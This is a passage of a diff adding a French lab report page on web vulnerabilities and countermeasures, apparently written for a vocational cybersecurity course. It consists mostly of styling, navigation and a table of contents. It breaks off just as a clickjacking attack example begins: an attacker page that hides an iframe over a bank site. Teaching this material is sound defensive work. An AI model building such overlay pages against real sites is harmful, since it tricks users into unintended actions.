@@ -1,0 +1,2069 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TP Cybersécurité — Failles & Contre-mesures</title>
+
+  <!-- Fonts — identiques à mahebrizion.fr -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;700;800&family=Inter:wght@300;400;500&family=JetBrains+Mono:wght@400;500&display=swap" />
+
+  <style>
+    /* ════════════════════════════════════════════════
+       TOKENS — copié fidèlement depuis mahebrizion.fr
+    ════════════════════════════════════════════════ */
+    :root {
+      --black:   #060608;
+      --white:   #f0eee9;
+      --grey-1:  #111116;
+      --grey-2:  #1e1e26;
+      --grey-3:  #8c8ca0;
+      --grey-4:  #b8b8c8;
+      --accent:  #c8ff57;           /* vert lime signature */
+      --font-d:  "Syne",  sans-serif;
+      --font-b:  "Inter", sans-serif;
+      --font-m:  "JetBrains Mono", monospace;
+      --ease-out:    cubic-bezier(0.16, 1, 0.3, 1);
+      --ease-in-out: cubic-bezier(0.45, 0, 0.55, 1);
+      --ease-back:   cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    *, ::before, ::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { font-size: 16px; scroll-behavior: smooth; scroll-padding-top: 80px; }
+
+    body {
+      background: var(--black);
+      color: var(--white);
+      font-family: var(--font-b);
+      font-weight: 400;
+      line-height: 1.7;
+      overflow-x: hidden;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    a { text-decoration: none; color: inherit; }
+    ::selection { background: var(--accent); color: var(--black); }
+    ::-webkit-scrollbar { width: 2px; }
+    ::-webkit-scrollbar-thumb { background: var(--accent); }
+
+    /* ════ GRAIN (texture animated noise) ════ */
+    @keyframes grain {
+      0%        { transform: translate(0, 0); }
+      33%       { transform: translate(-3%, 6%); }
+      66%       { transform: translate(6%, -4%); }
+      100%      { transform: translate(-5%, 3%); }
+    }
+
+    #grain {
+      position: fixed;
+      width: 300%; height: 300%;
+      top: -100%; left: -100%;
+      z-index: 9998;
+      pointer-events: none;
+      opacity: .038;
+      background-image: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='250' height='250'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/></filter><rect width='250' height='250' filter='url(%23n)'/></svg>");
+      background-size: 250px 250px;
+      animation: grain .6s steps(3, end) infinite;
+      will-change: transform;
+    }
+
+    /* ════ LAYOUT ════ */
+    .wrap {
+      max-width: 1360px;
+      margin: 0 auto;
+      padding: 0 clamp(24px, 5vw, 80px);
+    }
+
+    .divider {
+      height: 1px;
+      background: rgba(255,255,255,.06);
+    }
+
+    /* ════ ANIMATIONS ════ */
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(28px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes scrollBar {
+      0%  { height: 0%;   top: 0; }
+      50% { height: 100%; top: 0; }
+      51% { height: 100%; }
+      100%{ height: 0%;   top: 100%; }
+    }
+
+    @keyframes pulseDot {
+      0%, 100% { transform: scale(1);   opacity: 1; }
+      50%       { transform: scale(1.6); opacity: .55; }
+    }
+
+    @keyframes orbFloat {
+      0%, 100% { transform: translate(0, 0); }
+      33%       { transform: translate(40px, -30px); }
+      66%       { transform: translate(-20px, 20px); }
+    }
+
+    /* ════ PRINT BUTTON ════ */
+    .print-btn {
+      position: fixed;
+      bottom: 32px; right: 32px;
+      z-index: 900;
+      background: var(--accent);
+      color: var(--black);
+      border: none;
+      border-radius: 100px;
+      padding: 14px 28px;
+      font-family: var(--font-d);
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 8px 32px rgba(200,255,87,.35);
+      transition: transform .3s var(--ease-back), box-shadow .3s;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .print-btn:hover {
+      transform: translateY(-3px) scale(1.04);
+      box-shadow: 0 14px 44px rgba(200,255,87,.5);
+    }
+
+    /* ════════════════════════════════════════════════
+       COVER / HERO  (style identique hero mahebrizion)
+    ════════════════════════════════════════════════ */
+    .cover {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      position: relative;
+      overflow: hidden;
+      padding-bottom: clamp(60px, 10vw, 100px);
+    }
+
+    /* Ambient orbs */
+    .cover-orb {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: .18;
+      pointer-events: none;
+      animation: orbFloat 12s ease-in-out infinite;
+    }
+    .cover-orb-1 {
+      width: 520px; height: 520px;
+      background: var(--accent);
+      top: -160px; left: -120px;
+      animation-delay: 0s;
+    }
+    .cover-orb-2 {
+      width: 420px; height: 420px;
+      background: #57c8ff;
+      bottom: -100px; right: -80px;
+      animation-delay: -6s;
+      opacity: .12;
+    }
+
+    /* Grid overlay */
+    .cover-grid {
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(200,255,87,.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(200,255,87,.04) 1px, transparent 1px);
+      background-size: 60px 60px;
+      pointer-events: none;
+    }
+
+    /* Big name — style hero-name-wrap */
+    .cover-name-wrap {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -62%);
+      text-align: center;
+      width: 100%;
+      pointer-events: none;
+      user-select: none;
+    }
+
+    .cover-name-line { display: block; overflow: hidden; }
+
+    .cover-name-inner {
+      display: block;
+      font-family: var(--font-d);
+      font-size: clamp(5rem, 17vw, 18rem);
+      font-weight: 800;
+      line-height: .9;
+      letter-spacing: -.04em;
+      animation: fadeUp .9s var(--ease-out) .2s both;
+    }
+
+    .cover-name-inner.solid   { color: var(--white); }
+    .cover-name-inner.outline {
+      color: transparent;
+      -webkit-text-stroke: 1.5px rgba(240,238,233,.18);
+    }
+
+    /* Animated divider line */
+    .cover-line-wrap {
+      position: relative;
+      width: 100%;
+      overflow: hidden;
+    }
+    .cover-line {
+      height: 1px;
+      background: rgba(255,255,255,.08);
+      position: relative;
+    }
+    .cover-line-orb {
+      position: absolute;
+      top: -2px; left: 0;
+      width: 60px; height: 5px;
+      background: var(--accent);
+      border-radius: 3px;
+      box-shadow: 0 0 20px var(--accent);
+      animation: orbTravel 3.5s var(--ease-in-out) infinite;
+    }
+    @keyframes orbTravel {
+      0%, 100% { left: 0; }
+      50%       { left: calc(100% - 60px); }
+    }
+
+    /* Bottom info bar */
+    .cover-bottom {
+      position: relative;
+      z-index: 2;
+    }
+
+    .cover-bottom .wrap {
+      display: flex;
+      align-items: flex-end;
+      justify-content: space-between;
+      gap: 40px;
+      padding-top: 40px;
+    }
+
+    .cover-eyebrow {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+
+    .eyebrow-line {
+      display: block;
+      width: 32px; height: 1px;
+      background: var(--accent);
+    }
+
+    .eyebrow-text {
+      font-size: .7rem;
+      font-weight: 400;
+      letter-spacing: .12em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+    }
+
+    .cover-desc {
+      font-size: clamp(.95rem, 1.6vw, 1.15rem);
+      font-weight: 300;
+      color: var(--grey-4);
+      max-width: 560px;
+      line-height: 1.65;
+    }
+
+    .cover-desc strong { color: var(--white); font-weight: 500; }
+
+    /* Stats */
+    .cover-stats {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 20px;
+    }
+
+    .cover-stat { text-align: right; }
+
+    .stat-label {
+      display: block;
+      font-size: .65rem;
+      font-weight: 400;
+      letter-spacing: .1em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+      margin-bottom: 2px;
+    }
+
+    .stat-num {
+      font-family: var(--font-d);
+      font-size: clamp(1.8rem, 3.5vw, 2.6rem);
+      font-weight: 800;
+      color: var(--white);
+      letter-spacing: -.04em;
+    }
+
+    .stat-num .accent-num { color: var(--accent); }
+
+    /* ════ NAV ════ */
+    nav.doc-nav {
+      position: sticky;
+      top: 0;
+      z-index: 800;
+      padding: 18px 0;
+      background: rgba(6,6,8,.72);
+      backdrop-filter: blur(24px) saturate(180%);
+      -webkit-backdrop-filter: blur(24px) saturate(180%);
+      border-bottom: 1px solid rgba(255,255,255,.06);
+    }
+
+    .nav-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+
+    .nav-logo-doc {
+      font-family: var(--font-d);
+      font-size: .8rem;
+      font-weight: 700;
+      letter-spacing: .16em;
+      text-transform: uppercase;
+      color: var(--white);
+    }
+
+    .nav-links-doc {
+      display: flex;
+      list-style: none;
+      gap: 0;
+    }
+
+    .nav-links-doc a {
+      font-size: .7rem;
+      font-weight: 400;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+      padding: 6px 16px;
+      transition: color .2s;
+      position: relative;
+    }
+    .nav-links-doc a::after {
+      content: '';
+      position: absolute;
+      bottom: 0; left: 16px; right: 16px;
+      height: 1px;
+      background: var(--accent);
+      transform: scaleX(0);
+      transform-origin: left;
+      transition: transform .3s var(--ease-out);
+    }
+    .nav-links-doc a:hover { color: var(--white); }
+    .nav-links-doc a:hover::after { transform: scaleX(1); }
+
+    .nav-status-doc {
+      display: flex; align-items: center; gap: 8px;
+      font-size: .65rem;
+      letter-spacing: .1em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+    }
+    .nav-dot-doc {
+      width: 6px; height: 6px;
+      background: var(--accent);
+      border-radius: 50%;
+      animation: pulseDot 2s ease-in-out infinite;
+    }
+
+    /* ════ SECTION LABELS (style s-label) ════ */
+    .s-label {
+      font-family: var(--font-d);
+      font-size: .65rem;
+      font-weight: 700;
+      letter-spacing: .18em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+      margin-bottom: 48px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      animation: fadeUp .7s var(--ease-out) both;
+    }
+    .s-label::before {
+      content: attr(data-num);
+      color: var(--accent);
+    }
+    .s-label::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: rgba(255,255,255,.06);
+    }
+
+    /* ════════════════════════════════════════════════
+       SECTIONS TECHNOLOGIES
+    ════════════════════════════════════════════════ */
+    .tech-section {
+      padding: clamp(80px, 12vw, 140px) 0;
+      border-bottom: 1px solid rgba(255,255,255,.06);
+    }
+
+    .tech-header {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      margin-bottom: clamp(48px, 6vw, 72px);
+    }
+
+    .tech-icon {
+      width: 64px; height: 64px;
+      border-radius: 16px;
+      display: flex; align-items: center; justify-content: center;
+      font-family: var(--font-d);
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: .04em;
+      flex-shrink: 0;
+      border: 1px solid rgba(255,255,255,.08);
+    }
+
+    .tech-title-block h2 {
+      font-family: var(--font-d);
+      font-size: clamp(2.2rem, 4.5vw, 3.8rem);
+      font-weight: 800;
+      letter-spacing: -.04em;
+      line-height: 1;
+    }
+    .tech-title-block p {
+      font-size: .8rem;
+      color: var(--grey-3);
+      margin-top: 6px;
+      letter-spacing: .04em;
+    }
+
+    /* Tech-specific colors */
+    .t-html .tech-icon { background: rgba(227,109,40,.12); color: #e36d28; border-color: rgba(227,109,40,.2); }
+    .t-html .tech-title-block h2 { color: var(--white); }
+    .t-html .flaw-accent { color: #e36d28; }
+
+    .t-js .tech-icon { background: rgba(247,223,30,.1); color: #f7df1e; border-color: rgba(247,223,30,.18); }
+    .t-js .tech-title-block h2 { color: var(--white); }
+    .t-js .flaw-accent { color: #f7df1e; }
+
+    .t-php .tech-icon { background: rgba(139,143,204,.12); color: #8b8fcc; border-color: rgba(139,143,204,.2); }
+    .t-php .tech-title-block h2 { color: var(--white); }
+    .t-php .flaw-accent { color: #8b8fcc; }
+
+    .t-mysql .tech-icon { background: rgba(68,121,161,.12); color: #4479a1; border-color: rgba(68,121,161,.2); }
+    .t-mysql .tech-title-block h2 { color: var(--white); }
+    .t-mysql .flaw-accent { color: #4479a1; }
+
+    /* ════ FLAW ROWS (style experience-row de mahebrizion) ════ */
+    .flaw-row {
+      display: grid;
+      grid-template-columns: 200px 1fr;
+      gap: 48px;
+      padding: 40px 0;
+      border-top: 1px solid rgba(255,255,255,.06);
+      transition: border-color .3s;
+      animation: fadeUp .6s var(--ease-out) both;
+    }
+
+    .flaw-row:hover { border-top-color: rgba(255,255,255,.16); }
+
+    .flaw-left {
+      padding-top: 4px;
+    }
+
+    .flaw-severity {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      font-size: .65rem;
+      font-weight: 700;
+      letter-spacing: .1em;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+    }
+
+    .severity-dot {
+      width: 5px; height: 5px;
+      border-radius: 50%;
+    }
+
+    .sev-critique .severity-dot { background: #ff4060; }
+    .sev-critique                { color: #ff4060; }
+    .sev-haute    .severity-dot { background: #ff9040; }
+    .sev-haute                   { color: #ff9040; }
+    .sev-moyenne  .severity-dot { background: #ffcc40; }
+    .sev-moyenne                 { color: #ffcc40; }
+
+    .flaw-num {
+      font-family: var(--font-d);
+      font-size: 3.5rem;
+      font-weight: 800;
+      color: rgba(255,255,255,.04);
+      letter-spacing: -.06em;
+      line-height: 1;
+    }
+
+    .flaw-content {}
+
+    .flaw-title {
+      font-family: var(--font-d);
+      font-size: clamp(1.3rem, 2.2vw, 1.7rem);
+      font-weight: 700;
+      letter-spacing: -.02em;
+      color: var(--white);
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    /* Sub-blocks */
+    .sub-block {
+      margin-top: 24px;
+    }
+
+    .sub-label {
+      font-size: .62rem;
+      font-weight: 700;
+      letter-spacing: .15em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .sub-label::before { content: attr(data-icon); }
+
+    .sub-text {
+      font-size: .9rem;
+      font-weight: 300;
+      color: var(--grey-4);
+      line-height: 1.75;
+    }
+    .sub-text strong { color: var(--white); font-weight: 500; }
+    .sub-text ul { padding-left: 18px; }
+    .sub-text li { margin-bottom: 5px; }
+
+    /* Parade box — style about-quote */
+    .parade-box {
+      border-left: 2px solid var(--accent);
+      padding: 16px 20px;
+      margin-top: 12px;
+      background: rgba(200,255,87,.04);
+      border-radius: 0 8px 8px 0;
+    }
+
+    .parade-box ul { list-style: none; padding: 0; }
+    .parade-box li {
+      font-size: .87rem;
+      font-weight: 300;
+      color: var(--grey-4);
+      padding: 5px 0;
+      border-bottom: 1px solid rgba(200,255,87,.08);
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .parade-box li:last-child { border-bottom: none; }
+    .parade-box li::before { content: '→'; color: var(--accent); flex-shrink: 0; }
+    .parade-box li strong { color: var(--white); font-weight: 500; }
+
+    /* Code blocks */
+    .code-wrap {
+      margin-top: 14px;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,.06);
+    }
+
+    .code-topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      background: rgba(255,255,255,.03);
+      border-bottom: 1px solid rgba(255,255,255,.05);
+    }
+
+    .code-dots { display: flex; gap: 6px; }
+    .code-dot  { width: 10px; height: 10px; border-radius: 50%; }
+    .cd-r { background: rgba(255,96,96,.5); }
+    .cd-y { background: rgba(255,200,64,.5); }
+    .cd-g { background: rgba(64,200,80,.5); }
+
+    .code-lang {
+      font-family: var(--font-d);
+      font-size: .6rem;
+      font-weight: 700;
+      letter-spacing: .1em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+    }
+
+    .code-wrap pre {
+      background: #07080f;
+      padding: 18px 22px;
+      overflow-x: auto;
+      margin: 0;
+    }
+
+    .code-wrap code {
+      font-family: var(--font-m);
+      font-size: 12.5px;
+      line-height: 1.85;
+      color: #c8d3f5;
+      display: block;
+      white-space: pre;
+    }
+
+    /* Syntax highlight tokens */
+    .cc { color: #545878; font-style: italic; }   /* comment */
+    .ck { color: #bb9af7; }                        /* keyword */
+    .cs { color: #9ece6a; }                        /* string */
+    .cd { color: #ff4060; font-weight: 600; }      /* danger */
+    .cg { color: var(--accent); font-weight: 600;} /* safe/good */
+    .cn { color: #ff9e64; }                        /* number */
+    .ca { color: #7dcfff; }                        /* attr */
+
+    /* ════════════════════════════════════════════════
+       SUMMARY TABLE (style domains mahebrizion)
+    ════════════════════════════════════════════════ */
+    .summary-section {
+      padding: clamp(80px, 12vw, 140px) 0;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 48px;
+    }
+
+    thead tr {
+      border-bottom: 1px solid rgba(255,255,255,.1);
+    }
+
+    th {
+      text-align: left;
+      padding: 14px 0;
+      font-family: var(--font-d);
+      font-size: .62rem;
+      font-weight: 700;
+      letter-spacing: .15em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+    }
+
+    th:not(:first-child) { padding-left: 24px; }
+
+    td {
+      padding: 18px 0;
+      border-bottom: 1px solid rgba(255,255,255,.04);
+      font-size: .875rem;
+      font-weight: 300;
+      color: var(--grey-4);
+      vertical-align: top;
+    }
+    td:not(:first-child) { padding-left: 24px; }
+
+    tbody tr { transition: background .2s; }
+    tbody tr:hover td { background: rgba(255,255,255,.02); }
+
+    .tag-tech {
+      display: inline-block;
+      padding: 3px 10px;
+      border-radius: 100px;
+      font-family: var(--font-d);
+      font-size: .6rem;
+      font-weight: 700;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+    .tag-html  { background: rgba(227,109,40,.12); color: #e36d28; }
+    .tag-js    { background: rgba(247,223,30,.1);  color: #c8b000; }
+    .tag-php   { background: rgba(139,143,204,.12);color: #8b8fcc; }
+    .tag-mysql { background: rgba(68,121,161,.12); color: #4479a1; }
+
+    .sev-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 2px 10px;
+      border-radius: 100px;
+      font-size: .62rem;
+      font-weight: 700;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+    }
+    .sev-pill .sp-dot { width: 5px; height: 5px; border-radius: 50%; }
+    .sp-crit { background: rgba(255,64,96,.1);  color: #ff4060; }
+    .sp-crit .sp-dot { background: #ff4060; }
+    .sp-high { background: rgba(255,144,64,.1); color: #ff9040; }
+    .sp-high .sp-dot { background: #ff9040; }
+    .sp-med  { background: rgba(255,204,64,.1); color: #ffcc40; }
+    .sp-med .sp-dot  { background: #ffcc40; }
+
+    td.td-name { color: var(--white); font-weight: 400; }
+    td.td-para { color: var(--grey-4); font-size: .82rem; }
+    td.td-para code {
+      font-family: var(--font-m);
+      font-size: .78rem;
+      background: rgba(255,255,255,.06);
+      padding: 1px 6px;
+      border-radius: 4px;
+      color: var(--accent);
+    }
+
+    /* ════ CONCLUSION (style CTA) ════ */
+    .conclusion-section {
+      padding: clamp(80px, 14vw, 160px) 0;
+      text-align: center;
+    }
+
+    .cta-over {
+      font-family: var(--font-d);
+      font-size: .65rem;
+      font-weight: 700;
+      letter-spacing: .2em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+      display: block;
+      margin-bottom: 28px;
+    }
+
+    .cta-title {
+      font-family: var(--font-d);
+      font-size: clamp(3rem, 8vw, 7rem);
+      font-weight: 800;
+      letter-spacing: -.05em;
+      line-height: .95;
+      color: var(--white);
+      margin-bottom: 40px;
+    }
+
+    .cta-title .accent { color: var(--accent); }
+
+    .cta-text {
+      font-size: clamp(.95rem, 1.5vw, 1.1rem);
+      font-weight: 300;
+      color: var(--grey-4);
+      max-width: 680px;
+      margin: 0 auto 16px;
+      line-height: 1.75;
+    }
+    .cta-text strong { color: var(--white); font-weight: 500; }
+
+    /* ════ TOC ════ */
+    .toc-section {
+      padding: clamp(60px, 8vw, 100px) 0 0;
+    }
+
+    .toc-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 1px;
+      background: rgba(255,255,255,.06);
+      border: 1px solid rgba(255,255,255,.06);
+      border-radius: 16px;
+      overflow: hidden;
+      margin-top: 48px;
+    }
+
+    .toc-item {
+      padding: 28px 32px;
+      background: var(--black);
+      transition: background .2s;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      text-decoration: none;
+    }
+
+    .toc-item:hover { background: rgba(255,255,255,.025); }
+
+    .toc-item-num {
+      font-family: var(--font-d);
+      font-size: .62rem;
+      font-weight: 700;
+      color: var(--accent);
+      letter-spacing: .12em;
+      flex-shrink: 0;
+    }
+
+    .toc-item-name {
+      font-family: var(--font-d);
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: var(--white);
+    }
+
+    .toc-item-sub {
+      font-size: .8rem;
+      font-weight: 300;
+      color: var(--grey-3);
+      margin-top: 2px;
+    }
+
+    .toc-arrow {
+      margin-left: auto;
+      color: var(--grey-3);
+      font-size: 1.1rem;
+      transition: transform .2s var(--ease-out), color .2s;
+    }
+    .toc-item:hover .toc-arrow {
+      transform: translate(4px, -4px);
+      color: var(--accent);
+    }
+
+    /* ════ FOOTER ════ */
+    .doc-footer {
+      border-top: 1px solid rgba(255,255,255,.06);
+      padding: 40px 0;
+    }
+
+    .footer-inner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 20px;
+    }
+
+    .footer-logo {
+      font-family: var(--font-d);
+      font-size: .8rem;
+      font-weight: 700;
+      letter-spacing: .16em;
+      text-transform: uppercase;
+      color: var(--grey-3);
+    }
+
+    .footer-meta {
+      font-size: .72rem;
+      color: var(--grey-3);
+      text-align: right;
+    }
+
+    /* ════════════════════════════════════════════════
+       RESPONSIVE
+    ════════════════════════════════════════════════ */
+    @media (max-width: 768px) {
+      .flaw-row { grid-template-columns: 1fr; gap: 20px; }
+      .flaw-num { display: none; }
+      .toc-grid { grid-template-columns: 1fr; }
+      .cover-bottom .wrap { flex-direction: column; align-items: flex-start; }
+      .cover-stats { align-items: flex-start; flex-direction: row; gap: 32px; }
+      .nav-links-doc { display: none; }
+      table { display: block; overflow-x: auto; }
+    }
+
+    /* ════════════════════════════════════════════════
+       PRINT
+    ════════════════════════════════════════════════ */
+    @media print {
+      body { background: #fff; color: #111; font-size: 11px; }
+      .print-btn, #grain, nav.doc-nav,
+      .cover-orb, .cover-grid { display: none !important; }
+      .cover { min-height: auto; padding: 40px 0; break-after: page; }
+      .cover-name-inner.solid   { color: #111; }
+      .cover-name-inner.outline { -webkit-text-stroke: 1px #bbb; }
+      .cover-desc, .sub-text { color: #333; }
+      .cover-eyebrow .eyebrow-text { color: #666; }
+      .s-label { color: #666; }
+      .flaw-num { color: #eee; }
+      .flaw-title { color: #111; }
+      .parade-box { border-left-color: #222; background: #f5f5f5; }
+      .parade-box li { color: #333; border-color: #ddd; }
+      .parade-box li::before { color: #111; }
+      .code-wrap { border-color: #ddd; }
+      .code-topbar { background: #f0f0f0; border-color: #ddd; }
+      .code-wrap pre { background: #1a1a2e; }
+      .divider { background: #ddd; }
+      .tech-section { border-color: #eee; }
+      .toc-item { background: #f9f9f9 !important; border: 1px solid #eee; }
+      .toc-item-name { color: #111; }
+      .toc-item-sub { color: #666; }
+      .toc-grid { background: #ddd; }
+      td, th { border-color: #ddd !important; }
+      td.td-name { color: #111; }
+      td.td-para { color: #333; }
+      .cta-title { color: #111; font-size: 3rem; }
+      .cta-text { color: #333; }
+      .footer-logo, .footer-meta { color: #888; }
+      .flaw-row { break-inside: avoid; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Grain overlay -->
+<div id="grain" aria-hidden="true"></div>
+
+<!-- Export PDF button -->
+<button class="print-btn" onclick="window.print()" aria-label="Exporter en PDF">
+  ↗ Exporter PDF
+</button>
+
+<!-- ════════════════════════════════════════════════
+     NAV
+════════════════════════════════════════════════ -->
+<nav class="doc-nav" aria-label="Navigation du document">
+  <div class="wrap nav-inner">
+    <span class="nav-logo-doc">TP Cyber</span>
+    <ul class="nav-links-doc" role="list">
+      <li><a href="#html">HTML</a></li>
+      <li><a href="#javascript">JavaScript</a></li>
+      <li><a href="#php">PHP</a></li>
+      <li><a href="#mysql">MySQL</a></li>
+      <li><a href="#recap">Récap</a></li>
+    </ul>
+    <div class="nav-status-doc">
+      <span class="nav-dot-doc" aria-hidden="true"></span>
+      <span>2025–2026</span>
+    </div>
+  </div>
+</nav>
+
+<!-- ════════════════════════════════════════════════
+     COVER HERO
+════════════════════════════════════════════════ -->
+<section class="cover" aria-labelledby="cover-title">
+
+  <!-- Ambient orbs -->
+  <div class="cover-orb cover-orb-1" aria-hidden="true"></div>
+  <div class="cover-orb cover-orb-2" aria-hidden="true"></div>
+
+  <!-- Grid overlay -->
+  <div class="cover-grid" aria-hidden="true"></div>
+
+  <!-- Big title display -->
+  <div class="cover-name-wrap" aria-hidden="true">
+    <span class="cover-name-line">
+      <span class="cover-name-inner solid">Failles</span>
+    </span>
+    <span class="cover-name-line">
+      <span class="cover-name-inner outline">Web</span>
+    </span>
+  </div>
+
+  <h1 id="cover-title" class="sr-only" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)">
+    TP Cybersécurité — Failles de sécurité web et contre-mesures
+  </h1>
+
+  <!-- Line separator -->
+  <div class="cover-line-wrap" aria-hidden="true">
+    <div class="cover-line">
+      <div class="cover-line-orb"></div>
+    </div>
+  </div>
+
+  <!-- Bottom info bar -->
+  <div class="cover-bottom">
+    <div class="wrap">
+
+      <div>
+        <div class="cover-eyebrow" aria-hidden="true">
+          <span class="eyebrow-line"></span>
+          <span class="eyebrow-text">TP Cybersécurité · Bac Pro CIEL · 2025–2026</span>
+        </div>
+        <p class="cover-desc">
+          Analyse des principales vulnérabilités des technologies web :
+          <strong>HTML</strong>, <strong>JavaScript</strong>, <strong>PHP</strong> et <strong>MySQL</strong>.
+          Pour chaque faille : explication, exemple concret et parade.
+        </p>
+      </div>
+
+      <div class="cover-stats" aria-label="Statistiques">
+        <div class="cover-stat">
+          <span class="stat-label">Failles analysées</span>
+          <span class="stat-num">12<span class="accent-num">+</span></span>
+        </div>
+        <div class="cover-stat">
+          <span class="stat-label">Technologies</span>
+          <span class="stat-num">4</span>
+        </div>
+        <div class="cover-stat">
+          <span class="stat-label">Auteur</span>
+          <span class="stat-num" style="font-size:1.1rem;font-weight:700;letter-spacing:-.02em;color:var(--grey-4)">Nom&nbsp;Prénom</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</section>
+
+<!-- ════════════════════════════════════════════════
+     TABLE OF CONTENTS
+════════════════════════════════════════════════ -->
+<div class="toc-section">
+  <div class="wrap">
+    <p class="s-label" data-num="00" aria-hidden="true">Sommaire</p>
+
+    <div class="toc-grid" role="list">
+
+      <a href="#html" class="toc-item" role="listitem">
+        <span class="toc-item-num">01</span>
+        <div>
+          <div class="toc-item-name">HTML</div>
+          <div class="toc-item-sub">Clickjacking · Formulaires · Code source</div>
+        </div>
+        <span class="toc-arrow">↗</span>
+      </a>
+
+      <a href="#javascript" class="toc-item" role="listitem">
+        <span class="toc-item-num">02</span>
+        <div>
+          <div class="toc-item-name">JavaScript</div>
+          <div class="toc-item-sub">XSS · LocalStorage · CSRF</div>
+        </div>
+        <span class="toc-arrow">↗</span>
+      </a>
+
+      <a href="#php" class="toc-item" role="listitem">
+        <span class="toc-item-num">03</span>
+        <div>
+          <div class="toc-item-name">PHP</div>
+          <div class="toc-item-sub">LFI/RFI · Upload · Exposition erreurs</div>
+        </div>
+        <span class="toc-arrow">↗</span>
+      </a>
+
+      <a href="#mysql" class="toc-item" role="listitem">
+        <span class="toc-item-num">04</span>
+        <div>
+          <div class="toc-item-name">MySQL</div>
+          <div class="toc-item-sub">Injection SQL · Hashage · Privilèges</div>
+        </div>
+        <span class="toc-arrow">↗</span>
+      </a>
+
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- ════════════════════════════════════════════════
+     SECTION 1 — HTML
+════════════════════════════════════════════════ -->
+<section id="html" class="tech-section t-html">
+  <div class="wrap">
+
+    <p class="s-label" data-num="01" aria-hidden="true">Langage de structure</p>
+
+    <div class="tech-header">
+      <div class="tech-icon" aria-hidden="true">HTML</div>
+      <div class="tech-title-block">
+        <h2>HTML</h2>
+        <p>HyperText Markup Language · Structure des pages web</p>
+      </div>
+    </div>
+
+    <!-- Faille 1.1 -->
+    <div class="flaw-row" id="html-clickjacking">
+      <div class="flaw-left">
+        <div class="flaw-severity sev-haute">
+          <span class="severity-dot"></span>Haute
+        </div>
+        <div class="flaw-num">1.1</div>
+      </div>
+      <div class="flaw-content">
+        <h3 class="flaw-title">🖱️ Clickjacking</h3>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="📖 ">Explication</div>
+          <div class="sub-text">
+            Le <strong>Clickjacking</strong> consiste à superposer une page malveillante sur une page légitime
+            via une <code>&lt;iframe&gt;</code> rendue invisible. L'utilisateur croit interagir avec le site
+            malveillant, mais déclenche en réalité des actions sur le site légitime (virement bancaire,
+            modification de compte…).
+          </div>
+        </div>
+
+        <div class="sub-block">
+          <div class="sub-label" data-icon="💡 ">Exemple</div>
+          <div class="code-wrap">
+            <div class="code-topbar">
+              <div class="code-dots">
+                <div class="code-dot cd-r"></div>
+                <div class="code-dot cd-y"></div>
+                <div class="code-dot cd-g"></div>
+              </div>
+              <span class="code-lang">HTML — attaque</span>
+            </div>
+            <pre><code><span class="cc">&lt;!-- Page de l'attaquant — iframe invisible par-dessus votre banque --&gt;</span>
+<span class="ck">&lt;style&gt;</span>
+  <span class="cd">iframe</span> {
